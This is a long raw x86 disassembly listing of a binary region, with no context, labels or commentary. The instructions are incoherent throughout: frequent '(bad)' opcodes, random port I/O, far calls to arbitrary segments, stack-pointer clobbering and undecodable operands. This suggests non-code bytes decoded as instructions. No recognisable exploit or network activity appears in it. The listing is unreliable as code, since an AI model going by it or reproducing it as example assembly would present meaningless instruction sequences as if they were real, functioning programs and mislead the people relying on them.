  413638:	xchg   ebx,eax
  413639:	arpl   WORD PTR ds:[edx-0x57],sp
  41363d:	or     eax,0xa7883bae
  413642:	mov    eax,ds:0xd5fc0bc7
  413647:	mov    esi,0x30a1493d
  41364c:	sbb    eax,0x720cdc3a
  413651:	cmp    DWORD PTR [edx+0x2f4e3827],eax
  413657:	repnz test DWORD PTR [ebx],ecx
  41365a:	iret   
  41365b:	stos   DWORD PTR es:[edi],eax
  41365c:	jb     0x413628
  41365e:	or     BYTE PTR [ebx-0x2e],al
  413661:	jmp    0x413636
  413663:	ins    BYTE PTR es:[edi],dx
  413664:	mov    dh,0x1e
  413666:	push   ebx
  413667:	xchg   edx,eax
  413668:	mov    al,ds:0xc64b9a88
  41366d:	push   0x23
  41366f:	or     BYTE PTR [ebp-0x44],bl
  413672:	sar    BYTE PTR [eax],0x14
  413675:	loopne 0x41365f
  413677:	in     eax,dx
  413678:	retf   
  413679:	xor    eax,0x973be90b
  41367e:	ret    0xd772
  413681:	mov    dl,0x95
  413683:	cmp    bh,BYTE PTR [eax-0x3fbc3cae]
  413689:	test   eax,0xf902d23c
  41368e:	inc    ebp
  41368f:	mov    esp,0x44c78614
  413694:	xor    BYTE PTR [ecx],bh
  413696:	mov    WORD PTR [edi],gs
  413698:	shr    DWORD PTR [esi+0x7877729],1
  41369e:	jbe    0x413676
  4136a0:	mov    ecx,0x5e7734ae
  4136a5:	xor    al,0xb6
  4136a7:	mov    ebx,0x5c769480
  4136ac:	dec    edx
  4136ad:	pop    edi
  4136ae:	jne    0x413641
  4136b0:	jmp    0x413692
  4136b2:	mov    WORD PTR [edx],fs
  4136b4:	adc    eax,0x5692b0d6
  4136b9:	xchg   ecx,eax
  4136ba:	aaa    
  4136bb:	cdq    
  4136bc:	scas   eax,DWORD PTR es:[edi]
  4136bd:	rcr    ch,0xb0
  4136c0:	adc    DWORD PTR es:[edx+0x66],esp
  4136c4:	je     0x41364a
  4136c6:	dec    esi
  4136c7:	sub    eax,0xd9980b93
  4136cc:	fmul   st,st(3)
  4136ce:	sub    ecx,DWORD PTR [ecx-0x4127ecd5]
  4136d4:	dec    esi
  4136d5:	loopne 0x4136ca
  4136d7:	das    
  4136d8:	pusha  
  4136d9:	aas    
  4136da:	stos   DWORD PTR es:[edi],eax
  4136db:	ins    DWORD PTR es:[edi],dx
  4136dc:	fcom   QWORD PTR [ebp+0x71568d25]
  4136e2:	out    dx,al
  4136e3:	es fs push 0x374ad0c
  4136ea:	jne    0x41367b
  4136ec:	jp     0x413744
  4136ee:	out    dx,eax
  4136ef:	fld    DWORD PTR [edi+0x14]
  4136f2:	ror    DWORD PTR [ecx],cl
  4136f4:	cwde   
  4136f5:	ret    
  4136f6:	mov    esi,0x84e8ea43
  4136fb:	push   es
  4136fc:	xchg   DWORD PTR [edx],ebp
  4136fe:	(bad)  
  4136ff:	mov    edi,0xc43f3fe7
  413704:	sahf   
  413705:	inc    ebp
  413706:	adc    DWORD PTR [eax+eax*4],0x6c
  41370a:	fld    TBYTE PTR [esi+0x77]
  41370d:	das    
  41370e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41370f:	loop   0x41370d
  413711:	mov    gs,WORD PTR [edi+0x4d]
  413714:	(bad)  
  413715:	mov    al,ds:0xc092df10
  41371a:	push   0xffffffd0
  41371c:	scas   al,BYTE PTR es:[edi]
  41371d:	sbb    BYTE PTR [eax+esi*2],0xce
  413721:	in     eax,0xb9
  413723:	in     eax,0x4c
  413725:	test   bh,0x7e
  413728:	out    0x76,eax
  41372a:	mov    ?,WORD PTR [esi+0x6c]
  41372d:	rcr    DWORD PTR [ecx-0x14435060],cl
  413733:	mov    bh,0xd9
  413735:	lods   eax,DWORD PTR gs:[esi]
  413737:	repnz pop ecx
  413739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41373a:	stos   BYTE PTR es:[edi],al
  41373b:	nop
  41373c:	dec    edx
  41373d:	in     eax,dx
  41373e:	jmp    eax
  413740:	ja     0x41377b
  413742:	jne    0x7c6aa11e
  413748:	inc    ebp
  413749:	scas   al,BYTE PTR es:[edi]
  41374a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41374b:	cdq    
  41374c:	dec    eax
  41374d:	ins    BYTE PTR es:[edi],dx
  41374e:	(bad)  
  41374f:	push   esp
  413750:	pushf  
  413751:	mov    ebp,0xc8d7fb87
  413756:	lea    ebx,[edx+0x63]
  413759:	mov    eax,ds:0x6678777b
  41375e:	sti    
  41375f:	xor    al,0xc5
  413761:	ins    DWORD PTR es:[edi],dx
  413762:	jne    0x4136ff
  413764:	jecxz  0x4136fb
  413766:	loopne 0x4136ed
  413768:	cmp    esi,DWORD PTR [edi+0x1b3238cd]
  41376e:	test   BYTE PTR [eax+ebx*1+0x2b6f4d0],ah
  413775:	add    esp,esi
  413777:	test   eax,0x53400d35
  41377c:	mov    ds:0x2717ab93,al
  413781:	cmc    
  413782:	aaa    
  413783:	sub    al,0x5f
  413785:	and    esp,DWORD PTR [ebx+0x79be6b83]
  41378b:	or     eax,ebx
  41378d:	cmp    al,0x6
  41378f:	xchg   esp,eax
  413790:	sbb    BYTE PTR es:[esi],0x5c
  413794:	lea    esi,[eax-0x2f]
  413797:	push   ds
  413798:	pop    ecx
  413799:	xor    DWORD PTR [ecx],edi
  41379b:	adc    bh,cl
  41379d:	mov    al,ds:0x30d1a65f
  4137a2:	sbb    al,BYTE PTR [ebx]
  4137a4:	cs nop
  4137a6:	out    0xfa,eax
  4137a8:	leave  
  4137a9:	scas   al,BYTE PTR es:[edi]
  4137aa:	bnd jge 0x4137be
  4137ad:	push   ebx
  4137ae:	sub    eax,0x62196f84
  4137b3:	cmp    DWORD PTR [edx+esi*4-0x361ea47b],edx
  4137ba:	out    0x8,al
  4137bc:	test   BYTE PTR [ecx+0x5b],dl
  4137bf:	(bad)  
  4137c0:	mov    BYTE PTR [ecx+0x350fe355],dh
  4137c6:	pop    eax
  4137c7:	mov    edi,cs
  4137c9:	adc    al,0xaf
  4137cb:	cwde   
  4137cc:	mov    ?,WORD PTR cs:[edi+ecx*8]
  4137d0:	idiv   BYTE PTR [ebx]
  4137d2:	cmc    
  4137d3:	cwde   
  4137d4:	(bad)  
  4137d5:	lock xchg ecx,eax
  4137d7:	ficomp DWORD PTR [ebp-0x65]
  4137da:	inc    DWORD PTR [esi-0x49]
  4137dd:	push   es
  4137de:	inc    esp
  4137df:	add    al,0x6a
  4137e1:	rcl    BYTE PTR [eax+edi*2+0x16],cl
  4137e5:	lods   al,BYTE PTR ds:[esi]
  4137e6:	push   ss
  4137e7:	mov    bl,BYTE PTR [esi-0x15cbe3e]
  4137ed:	fwait
  4137ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ef:	sbb    BYTE PTR [esi-0x57],ch
  4137f2:	mov    WORD PTR [ebp+0x3ee23077],ss
  4137f8:	popa   
  4137f9:	inc    ebx
  4137fa:	nop
  4137fb:	xchg   ecx,eax
  4137fc:	mov    ebp,0x6307a587
  413801:	outs   dx,DWORD PTR ds:[esi]
  413802:	sub    BYTE PTR [edi-0x75],dh
  413805:	mov    dl,0x5e
  413807:	test   eax,0x33880532
  41380c:	out    0xdc,al
  41380e:	(bad)  
  41380f:	adc    eax,0xd8e459d2
  413814:	xchg   ch,cl
  413816:	pushf  
  413817:	fwait
  413818:	aas    
  413819:	ror    DWORD PTR [ecx+0x51],cl
  41381c:	mov    eax,0x72d7e5bc
  413821:	into   
  413822:	cmp    DWORD PTR [eax+0x4bad69cf],eax
  413828:	test   BYTE PTR [ebp-0x3d441950],0x98
  41382f:	mov    bh,0x38
  413831:	pop    edi
  413832:	sar    BYTE PTR [edx+ebp*4],1
  413835:	xchg   DWORD PTR ds:0x8ac120a9,eax
  41383b:	or     eax,0x69502f16
  413840:	push   ss
  413841:	out    0x98,eax
  413843:	mov    ds:0xac744c48,al
  413848:	test   DWORD PTR [esi*4-0x22c14bb3],esp
  41384f:	jns    0x4137e5
  413851:	test   DWORD PTR [edx+0x48afcd91],esi
  413857:	imul   ebx,DWORD PTR [edx+0x7dd2f670],0x3c84ce8
  413861:	mov    bh,0xcc
  413863:	mov    ch,0xa6
  413865:	fist   DWORD PTR [ebp-0x14bd7cb5]
  41386b:	jne    0x4138e1
  41386d:	into   
  41386e:	pop    ebp
  41386f:	dec    edi
  413870:	pop    ds
  413871:	outs   dx,DWORD PTR ds:[esi]
  413872:	fild   QWORD PTR [edi-0x1022aa72]
  413878:	aad    0x48
  41387a:	jno    0x41382b
  41387c:	sub    DWORD PTR [ecx+0x4822b68d],esi
  413882:	lds    ebx,FWORD PTR [ebx+0x4abb130b]
  413888:	adc    bl,BYTE PTR [edi]
  41388a:	cmp    edi,0x5c95f90e
  413890:	inc    ecx
  413891:	fsubr  QWORD PTR [ebp-0x2b]
  413894:	lods   al,BYTE PTR ds:[esi]
  413895:	int    0x21
  413897:	pushf  
  413898:	xor    BYTE PTR [ebx+0x20],bl
  41389b:	jle    0x4138e1
  41389d:	inc    esi
  41389e:	into   
  41389f:	test   eax,0x2b8cef0b
  4138a4:	test   BYTE PTR [eax+0x41],ch
  4138a7:	dec    DWORD PTR [ebx+0xf]
  4138aa:	fidivr WORD PTR [edx]
  4138ac:	inc    eax
  4138ad:	out    dx,eax
  4138ae:	into   
  4138af:	sbb    BYTE PTR ds:0x91e52c50,ch
  4138b5:	adc    eax,0x1b330abc
  4138ba:	mov    edx,0xbeb19eff
  4138bf:	dec    ecx
  4138c0:	jo     0x413927
  4138c2:	pop    edi
  4138c3:	adc    eax,0x4e923834
  4138c8:	cmp    dl,cl
  4138ca:	test   eax,0x516b3b80
  4138cf:	xor    al,0xbc
  4138d1:	pop    esi
  4138d2:	sub    al,0x6d
  4138d4:	adc    edx,DWORD PTR [edx-0x75]
  4138d7:	enter  0xbc4e,0xa2
  4138db:	cmp    eax,0xcd4cbbd5
  4138e0:	add    DWORD PTR [ebx],ebx
  4138e2:	mov    cl,0x9a
  4138e4:	je     0x41393f
  4138e6:	mov    dl,0xf1
  4138e8:	xor    DWORD PTR [eax+0x75],esp
  4138eb:	mov    ebx,0x5764c8ea
  4138f0:	test   DWORD PTR [esi+0x5e],0x2c6bd5b1
  4138f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138f8:	sbb    eax,0x4513edd1
  4138fd:	fistp  QWORD PTR [edx]
  4138ff:	push   edx
  413900:	sub    DWORD PTR [edx+edx*2-0x43a00129],ebx
  413907:	in     al,dx
  413908:	xor    DWORD PTR [eax-0x23],edi
  41390b:	xlat   BYTE PTR ds:[ebx]
  41390c:	pushf  
  41390d:	mov    eax,ds:0xa412b574
  413912:	push   edi
  413913:	sub    bl,ch
  413915:	mov    esp,0x8a2c5ab
  41391a:	repz lock inc edi
  41391d:	xor    eax,0xc0ff8bfb
  413922:	add    bh,dh
  413924:	or     al,0x21
  413926:	mov    ah,0x43
  413928:	lods   eax,DWORD PTR ds:[esi]
  413929:	push   cs
  41392a:	add    dh,0x7f
  41392d:	push   ds
  41392e:	std    
  41392f:	add    al,0x71
  413931:	cwde   
  413932:	or     eax,0x237331c
  413937:	inc    esi
  413938:	push   ecx
  413939:	adc    BYTE PTR [esi+0x22],ah
  41393c:	and    esi,ebx
  41393e:	shl    DWORD PTR [edx],cl
  413940:	pop    ecx
  413941:	cmp    cl,bh
  413943:	mov    edi,0x8cfa6d30
  413948:	int3   
  413949:	inc    ecx
  41394a:	dec    DWORD PTR [edi+0x5dab6140]
  413950:	jne    0x41399f
  413952:	lds    esp,FWORD PTR [ebp-0x58]
  413955:	addr16 dec eax
  413957:	jb     0x413998
  413959:	enter  0x9287,0x8b
  41395d:	dec    edi
  41395e:	pop    ebx
  41395f:	push   0xffffffcb
  413961:	out    0x2c,al
  413963:	dec    ebx
  413964:	sub    eax,DWORD PTR [ecx-0x5a]
  413967:	push   ebx
  413968:	dec    ebp
  413969:	lock add dh,BYTE PTR [ebx+ebp*8-0xd]
  41396e:	xchg   edx,eax
  41396f:	dec    esi
  413970:	jns    0x4139dc
  413972:	jl     0x41399c
  413974:	int3   
  413975:	clc    
  413976:	cmp    cl,BYTE PTR [ebx+0xa]
  413979:	fbstp  TBYTE PTR [eax+0x41c6469f]
  41397f:	push   ss
  413980:	cmp    dl,BYTE PTR [ebx-0x22]
  413983:	add    DWORD PTR [esp+eiz*4+0x1678fc7b],edx
  41398a:	pop    eax
  41398b:	mov    bh,0x7f
  41398d:	loop   0x41395c
  41398f:	adc    BYTE PTR [edi+0x1c],al
  413992:	add    edi,ebp
  413994:	sub    al,0x26
  413996:	mov    ds:0x21e0554a,al
  41399b:	push   DWORD PTR [esi+0x7f]
  41399e:	inc    ebp
  41399f:	pop    esi
  4139a0:	ja     0x413945
  4139a2:	sub    eax,0x2a97e738
  4139a7:	add    al,BYTE PTR cs:[edi]
  4139aa:	sub    cl,0xc4
  4139ad:	je     0x413971
  4139af:	addr16 mov esp,0x45ddc675
  4139b5:	mov    esp,0x12067f62
  4139ba:	call   0xb1e7:0x4fc72cb1
  4139c1:	dec    edi
  4139c2:	xor    al,0x42
  4139c4:	leave  
  4139c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139c6:	mov    ecx,0x7a5470f8
  4139cb:	xchg   DWORD PTR [edx],ebx
  4139cd:	adc    esi,esi
  4139cf:	in     eax,dx
  4139d0:	mov    dh,0xc7
  4139d2:	inc    edx
  4139d3:	xchg   edx,eax
  4139d4:	aas    
  4139d5:	mov    edx,0xd40967ff
  4139da:	xchg   esi,eax
  4139db:	test   eax,0x242f1d6e
  4139e0:	call   0x67a3:0x27240132
  4139e7:	push   edi
  4139e8:	mov    esi,0xfc705a8d
  4139ed:	(bad)  
  4139ee:	fwait
  4139ef:	scas   al,BYTE PTR es:[edi]
  4139f0:	dec    eax
  4139f1:	jno    0x4139da
  4139f3:	pushf  
  4139f4:	je     0x413a1e
  4139f6:	call   FWORD PTR [ecx-0xd]
  4139f9:	add    bl,BYTE PTR [edx-0x1a]
  4139fc:	sbb    eax,0xab99526a
  413a01:	pop    ebx
  413a02:	cdq    
  413a03:	xchg   BYTE PTR [ebx-0x26],ch
  413a06:	and    al,0xc7
  413a08:	test   BYTE PTR ds:0xd0abdf80,al
  413a0e:	pop    ebx
  413a0f:	push   ds
  413a10:	mov    bl,0xae
  413a12:	and    ebp,DWORD PTR [edi-0x4da45c76]
  413a18:	add    dl,BYTE PTR [ecx+0x17da9c3a]
  413a1e:	jo     0x413a98
  413a20:	pop    eax
  413a21:	cmp    DWORD PTR ds:0xbb9cb7a4,0x66
  413a28:	not    BYTE PTR [ebp-0x29]
  413a2b:	ds push 0x3c333731
  413a31:	mov    ecx,0x97e1badc
  413a36:	sub    eax,0x9ec48b19
  413a3b:	lds    ebp,FWORD PTR [ebp*4+0x21ccee90]
  413a42:	rol    DWORD PTR [edi],1
  413a44:	stos   DWORD PTR es:[edi],eax
  413a45:	pop    esp
  413a46:	out    0xe,al
  413a48:	xchg   esp,eax
  413a49:	jl     0x413a76
  413a4b:	aam    0xb6
  413a4d:	lahf   
  413a4e:	sti    
  413a4f:	adc    cl,0x2
  413a52:	sub    eax,0xdccdc74c
  413a57:	nop
  413a58:	adc    DWORD PTR [esi+0x2b98b705],esp
  413a5e:	xchg   ebx,eax
  413a5f:	retf   
  413a60:	xor    eax,DWORD PTR [edi+ebx*1+0x602c4fdb]
  413a67:	data16 aam 0x8
  413a6a:	dec    ecx
  413a6b:	in     eax,dx
  413a6c:	dec    esp
  413a6d:	inc    eax
  413a6e:	inc    esi
  413a6f:	std    
  413a70:	lea    ebx,[edi+0x64]
  413a73:	sbb    eax,0x8ef85ec
  413a78:	ins    DWORD PTR es:[edi],dx
  413a79:	out    dx,eax
  413a7a:	neg    DWORD PTR [esp+esi*4-0xd]
  413a7e:	dec    esp
  413a7f:	lea    edx,[ecx-0x60d0d38b]
  413a85:	in     al,0x33
  413a87:	cld    
  413a88:	fmul   DWORD PTR ds:0xb91b2475
  413a8e:	xor    BYTE PTR [ecx],al
  413a90:	retf   
  413a91:	adc    bl,0x73
  413a94:	sbb    edx,edx
  413a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a97:	jge    0x413a54
  413a99:	add    ah,BYTE PTR [ecx-0x1e229acc]
  413a9f:	pop    ecx
  413aa0:	mov    ah,0xa7
  413aa2:	push   ebp
  413aa3:	rcl    BYTE PTR [ecx-0x57],0x20
  413aa7:	inc    esp
  413aa8:	sahf   
  413aa9:	scas   eax,DWORD PTR es:[edi]
  413aaa:	cmp    BYTE PTR [ebx-0x1aa90560],bl
  413ab0:	sbb    dl,BYTE PTR [edx]
  413ab2:	test   cl,al
  413ab4:	xlat   BYTE PTR ds:[ebx]
  413ab5:	jmp    0x413a9a
  413ab7:	inc    esi
  413ab8:	xor    eax,0xd5597910
  413abd:	pop    ebx
  413abe:	adc    edi,ecx
  413ac0:	push   ebp
  413ac1:	sub    DWORD PTR [ebx-0x1f],esi
  413ac4:	mov    ecx,ebp
  413ac6:	out    0x9e,eax
  413ac8:	outs   dx,DWORD PTR ds:[esi]
  413ac9:	add    bl,cl
  413acb:	jnp    0x413ae7
  413acd:	push   ebp
  413ace:	(bad)  
  413acf:	popa   
  413ad0:	xchg   edi,eax
  413ad1:	jns    0x413ae2
  413ad3:	mov    esi,0x76b8e271
  413ad8:	mov    es,WORD PTR [ebx+0x26fa6fea]
  413ade:	mov    edi,0x8976587e
  413ae3:	pusha  
  413ae4:	cdq    
  413ae5:	lods   al,BYTE PTR ds:[esi]
  413ae6:	ins    DWORD PTR es:[edi],dx
  413ae7:	sub    al,0xd6
  413ae9:	fidivr WORD PTR [ebp+0x195fe02a]
  413aef:	(bad)  
  413af0:	mov    dl,0xb3
  413af2:	add    eax,0xa019d499
  413af7:	cmc    
  413af8:	rol    BYTE PTR [eax+0x33],0x78
  413afc:	mov    ebp,0x30895a96
  413b01:	add    cl,dl
  413b03:	repz jl 0x413a86
  413b06:	mov    al,ds:0x68437d37
  413b0b:	outs   dx,BYTE PTR ds:[esi]
  413b0c:	xor    ebp,DWORD PTR ds:0xd4e14af7
  413b12:	push   ebx
  413b13:	sub    al,0x20
  413b15:	(bad)  
  413b16:	int3   
  413b17:	xlat   BYTE PTR ds:[ebx]
  413b18:	xchg   BYTE PTR [ebx],ch
  413b1a:	ds stos BYTE PTR es:[edi],al
  413b1c:	mov    bl,0xb9
  413b1e:	add    DWORD PTR [edx],edi
  413b20:	jmp    0x3e83:0xb031d353
  413b27:	inc    esp
  413b28:	and    ebx,DWORD PTR [ebx+0x1ec8564e]
  413b2e:	lahf   
  413b2f:	mov    ebp,0x5015c6af
  413b34:	inc    esi
  413b35:	outs   dx,DWORD PTR ds:[esi]
  413b36:	nop
  413b37:	or     esp,esi
  413b39:	fild   DWORD PTR [ebp-0x14836292]
  413b3f:	arpl   cx,dx
  413b41:	mov    ebp,0xae71e7e1
  413b46:	out    dx,eax
  413b47:	sar    ch,0x14
  413b4a:	mov    edi,0x1cbc0254
  413b4f:	out    0xbd,al
  413b51:	push   esi
  413b52:	scas   eax,DWORD PTR es:[edi]
  413b53:	xchg   ecx,eax
  413b54:	dec    edx
  413b55:	or     al,BYTE PTR [ecx]
  413b57:	cwde   
  413b58:	addr16 pop esp
  413b5a:	sahf   
  413b5b:	sbb    eax,0x257e3d59
  413b60:	test   BYTE PTR [ebx+0x2],0xa9
  413b64:	out    dx,eax
  413b65:	sbb    BYTE PTR [ebx],0xc2
  413b68:	pop    ds
  413b69:	jae    0x413bc4
  413b6b:	sti    
  413b6c:	adc    BYTE PTR [ecx+0x74],0x10
  413b70:	out    0x94,eax
  413b72:	mov    edi,0x2ff6c992
  413b77:	sub    al,0xe8
  413b79:	mov    dh,0xd5
  413b7b:	pop    ecx
  413b7c:	cmp    BYTE PTR [eax-0x19],0x4c
  413b80:	or     bl,BYTE PTR [edx+0x29]
  413b83:	mov    dl,0x7c
  413b85:	aas    
  413b86:	adc    DWORD PTR [edi-0x220d25bf],ecx
  413b8c:	in     eax,0x24
  413b8e:	ins    BYTE PTR es:[edi],dx
  413b8f:	inc    eax
  413b90:	mov    ds:0xae155734,al
  413b95:	mov    eax,0x43cca3c6
  413b9a:	ffreep st(0)
  413b9c:	push   ds
  413b9d:	mov    ebp,0xa08088b7
  413ba2:	adc    al,0xc9
  413ba4:	stos   BYTE PTR es:[edi],al
  413ba5:	pop    ss
  413ba6:	xchg   ebx,eax
  413ba7:	int    0xd9
  413ba9:	lods   eax,DWORD PTR ds:[esi]
  413baa:	inc    edx
  413bab:	call   0x99b4c72e
  413bb0:	cmp    eax,0x2494ac78
  413bb5:	stos   DWORD PTR es:[edi],eax
  413bb6:	scas   eax,DWORD PTR es:[edi]
  413bb7:	out    dx,eax
  413bb8:	adc    BYTE PTR [ebx+0x61],ah
  413bbb:	das    
  413bbc:	call   0x8b26726c
  413bc1:	stos   DWORD PTR es:[edi],eax
  413bc2:	mov    es,WORD PTR [ebx]
  413bc4:	jecxz  0x413c15
  413bc6:	sbb    eax,0xa34d42b1
  413bcb:	(bad)  
  413bcd:	jmp    0x413c30
  413bcf:	jo     0x413bc0
  413bd1:	mov    ds:0x89893c28,eax
  413bd6:	cmp    eax,0xe0a2404
  413bdb:	nop
  413bdc:	cmc    
  413bdd:	jbe    0x413bf4
  413bdf:	xor    al,0xad
  413be1:	int3   
  413be2:	sub    eax,0x4e1ced45
  413be7:	cld    
  413be8:	fwait
  413be9:	test   BYTE PTR [eax+0x2a],dl
  413bec:	lock jbe 0x413be4
  413bef:	(bad)  
  413bf0:	mov    bl,0x61
  413bf2:	sti    
  413bf3:	cli    
  413bf4:	adc    cl,0xd
  413bf7:	aas    
  413bf8:	jp     0x413c6e
  413bfa:	and    dh,ah
  413bfc:	sti    
  413bfd:	mov    cs,edi
  413bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c00:	or     ah,dl
  413c02:	addr16 jns 0x413c74
  413c05:	or     DWORD PTR [ebx],ebp
  413c07:	jle    0x413bc5
  413c09:	dec    esp
  413c0a:	lods   al,BYTE PTR ds:[esi]
  413c0b:	sbb    al,0xf7
  413c0d:	add    BYTE PTR [ebx+0x76297b6],0x47
  413c14:	fnstsw WORD PTR [edi-0x2c585451]
  413c1a:	inc    edx
  413c1b:	mov    WORD PTR [eax+0x7e3f43a0],fs
  413c21:	xchg   ebp,eax
  413c22:	cmp    BYTE PTR [edi+0x7c4bf294],bh
  413c28:	sub    eax,DWORD PTR [esi]
  413c2a:	into   
  413c2b:	ins    BYTE PTR es:[edi],dx
  413c2c:	daa    
  413c2d:	push   edi
  413c2e:	push   edi
  413c2f:	or     al,0x26
  413c31:	jmp    0xa217761a
  413c36:	pop    ss
  413c37:	test   DWORD PTR [esi+0x5d],ebp
  413c3a:	int    0x4a
  413c3c:	imul   esi,DWORD PTR [esi],0x31
  413c3f:	cmp    DWORD PTR [esi+edi*8+0x3b],esi
  413c43:	and    ah,BYTE PTR [ecx+0x67]
  413c46:	inc    edi
  413c47:	mov    ecx,0x33298dc1
  413c4c:	adc    al,0x9a
  413c4e:	(bad)  
  413c4f:	jge    0x413c0b
  413c51:	fwait
  413c52:	adc    eax,0x713943ce
  413c57:	sub    ah,BYTE PTR [eax+0x30]
  413c5a:	outs   dx,DWORD PTR ds:[esi]
  413c5b:	xor    DWORD PTR ss:[edi-0x3439d3bb],ecx
  413c62:	sbb    eax,0x808dc14a
  413c67:	repnz pushf 
  413c69:	sti    
  413c6a:	push   ebx
  413c6b:	ret    0x7da4
  413c6e:	aas    
  413c6f:	dec    BYTE PTR [ebp*2-0x49db502c]
  413c76:	mov    dh,0x9b
  413c78:	mov    edx,0x45806f2d
  413c7d:	loop   0x413cb7
  413c7f:	in     eax,0x82
  413c81:	sub    esi,esi
  413c83:	push   eax
  413c84:	dec    esi
  413c85:	dec    edx
  413c86:	and    eax,0xc26276e
  413c8b:	and    al,0xcd
  413c8d:	ficomp WORD PTR [edx+edi*8]
  413c90:	or     BYTE PTR [edi-0x632a1b00],al
  413c96:	repnz retf 
  413c98:	push   0x771eb9a7
  413c9d:	sub    bl,BYTE PTR [eax+0x54]
  413ca0:	mov    ah,0x4c
  413ca2:	stc    
  413ca3:	jp     0x413d1a
  413ca5:	enter  0x7430,0x69
  413ca9:	push   edi
  413caa:	out    dx,al
  413cab:	psubusb mm6,mm6
  413cae:	push   esp
  413caf:	div    DWORD PTR [bp+si-0x4d3b]
  413cb4:	jae    0x413c46
  413cb6:	mov    al,ds:0x5fd9e35b
  413cbb:	mov    ah,0x17
  413cbd:	push   ecx
  413cbe:	cmp    bl,ch
  413cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc1:	pop    es
  413cc2:	add    DWORD PTR [ebp+0x55],esi
  413cc5:	mov    dl,0xb1
  413cc7:	jecxz  0x413cf6
  413cc9:	rcr    BYTE PTR [ebx+0x36],1
  413ccc:	das    
  413ccd:	dec    esp
  413cce:	mov    al,ds:0x1dda115e
  413cd3:	jle    0x413c56
  413cd5:	sub    eax,eax
  413cd7:	cmp    al,0x67
  413cd9:	add    eax,0xdc44d79c
  413cde:	sbb    al,0xa1
  413ce0:	mov    edi,ebx
  413ce2:	daa    
  413ce3:	and    edi,DWORD PTR [ebp-0x1b]
  413ce6:	pop    edi
  413ce7:	std    
  413ce8:	ret    0xcdcc
  413ceb:	iret   
  413cec:	lea    ecx,[ebx+0x691e3406]
  413cf2:	test   cl,bh
  413cf4:	lods   eax,DWORD PTR ds:[esi]
  413cf5:	ja     0x413cde
  413cf7:	or     bl,BYTE PTR fs:[edx+ecx*8+0x4e49fbae]
  413cff:	outs   dx,BYTE PTR ds:[esi]
  413d00:	lods   al,BYTE PTR ds:[esi]
  413d01:	jmp    0xd5fd:0xf3f17c25
  413d08:	test   BYTE PTR [ebx+ebp*2],0xbc
  413d0c:	add    al,0xe9
  413d0e:	fst    DWORD PTR [eax]
  413d10:	push   edi
  413d11:	xor    BYTE PTR [ebx+0x21],al
  413d14:	out    0xba,eax
  413d16:	mov    eax,gs
  413d18:	xchg   ecx,eax
  413d19:	jbe    0x413d5c
  413d1b:	and    eax,0x80d7ee59
  413d20:	lea    ecx,[ecx]
  413d22:	push   ss
  413d23:	stos   DWORD PTR es:[edi],eax
  413d24:	cs popf 
  413d26:	lahf   
  413d27:	mov    cl,al
  413d29:	rol    eax,1
  413d2b:	jmp    0x5bdf:0xb9916685
  413d32:	xlat   BYTE PTR ds:[ebx]
  413d33:	push   0xdc97fbfd
  413d38:	push   cs
  413d39:	mov    WORD PTR ds:0x6684f91,?
  413d3f:	(bad)  
  413d40:	out    dx,eax
  413d41:	dec    edi
  413d42:	retf   0x6f90
  413d45:	fisubr DWORD PTR [eax+ebx*1+0x2c]
  413d49:	adc    al,0x90
  413d4b:	and    eax,DWORD PTR [di+0x6c05]
  413d50:	push   0x384356ea
  413d55:	pop    eax
  413d56:	mov    bl,0xa3
  413d58:	(bad)  
  413d59:	stc    
  413d5a:	mov    dl,0x18
  413d5c:	xor    eax,0x2d593aa9
  413d61:	inc    edi
  413d62:	fadd   QWORD PTR [edi]
  413d64:	aad    0x55
  413d66:	push   ecx
  413d67:	mov    ?,ebp
  413d69:	das    
  413d6a:	or     al,0xcc
  413d6c:	jae    0x413dd4
  413d6e:	jae    0x413d28
  413d70:	test   edx,edi
  413d72:	cmp    BYTE PTR [ecx-0x7d681b64],al
  413d78:	hlt    
  413d79:	cmp    BYTE PTR [esi],ch
  413d7b:	dec    eax
  413d7c:	dec    ecx
  413d7d:	add    BYTE PTR [esi+0x387f58b3],cl
  413d83:	clc    
  413d84:	xor    ah,ch
  413d86:	adc    esp,DWORD PTR [eax]
  413d88:	into   
  413d89:	aas    
  413d8a:	and    al,0x6e
  413d8c:	sbb    edi,ebx
  413d8e:	in     al,dx
  413d8f:	mov    esi,0xc3ce02d4
  413d94:	or     ebx,DWORD PTR [edi+eax*2+0x3b]
  413d98:	mov    edx,0xa0ce3858
  413d9d:	imul   esp,DWORD PTR [esi],0x530c17a0
  413da3:	cs pop esi
  413da5:	add    bh,dl
  413da7:	daa    
  413da8:	std    
  413da9:	mov    cl,0x2d
  413dab:	mov    al,0x76
  413dad:	cmp    eax,eax
  413daf:	ins    BYTE PTR es:[edi],dx
  413db0:	or     cl,BYTE PTR [ebp-0x6f4e7684]
  413db6:	sub    al,0xe6
  413db8:	stos   DWORD PTR es:[edi],eax
  413db9:	mov    esp,0x506655fe
  413dbe:	fistp  WORD PTR [ebx+eax*4]
  413dc1:	ret    0xa9ef
  413dc4:	call   0x3195:0x46e06259
  413dcb:	call   0xc353:0x60a0352c
  413dd2:	pop    ecx
  413dd3:	mov    ds:0x59aeaf63,eax
  413dd8:	nop
  413dd9:	je     0x413e4a
  413ddb:	pop    eax
  413ddc:	out    dx,eax
  413ddd:	xlat   BYTE PTR ds:[ebx]
  413dde:	cwde   
  413ddf:	iret   
  413de0:	mov    ecx,0xc32d8563
  413de5:	outs   dx,BYTE PTR ds:[esi]
  413de6:	(bad)  
  413de7:	shl    DWORD PTR ds:0x99f25551,cl
  413ded:	push   ebp
  413dee:	call   0xb14e:0x51263f52
  413df5:	pop    ebp
  413df6:	sub    al,0xd7
  413df8:	lds    ebx,FWORD PTR [edi+0x5d]
  413dfb:	xor    esi,DWORD PTR [eax+0x5774f3bf]
  413e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e02:	mov    ebp,eax
  413e04:	adc    eax,DWORD PTR [edi+0x5f]
  413e07:	xchg   BYTE PTR [ecx],ah
  413e09:	das    
  413e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
